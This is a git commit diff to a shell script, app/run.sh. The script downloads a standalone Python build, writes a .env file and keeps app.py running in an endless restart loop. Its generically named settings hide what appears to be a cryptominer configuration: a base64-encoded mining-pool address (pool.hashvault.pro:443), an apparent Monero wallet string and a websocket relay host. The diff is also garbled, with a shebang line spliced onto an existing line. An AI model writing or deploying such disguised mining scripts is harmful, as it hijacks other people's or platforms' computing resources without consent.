4c1568151528a5b6dd28db8478182d16db40223b
gaserjuk <gaserjukilo@gmail.com>
2026-07-17 23:24:56 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -5,6 +5,27 @@ echo "SERVER_WS=ws://supporting-susan-volvo-d910cf7c.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
-SERVER_CONNECTION=${CONNECT}
+SERVER_CONNECTION=${CONNECT}#!/bin/bash
+PORT=$1
+NAME=$2
+if [ ! -d "python" ]; then
+  echo "Python folder not found → downloading..."
+  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+else
+  echo "Python already exists → skip download"
+fi
+export PATH=./python/bin:$PATH
+yes |  pip install certifi
+export SSL_CERT_FILE=$(python -m certifi)
+echo "SERVER_WS=ws://supporting-susan-volvo-d910cf7c.koyeb.app
+SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
+SERVER_SECRET=$NAME
+SERVER_CONNECTION=$PORT
 SERVER_MODE=FAST" > .env
-while true; do python3 app.py; sleep 15; done
+while true; do
+  python3 app.py
+  sleep 15
+done
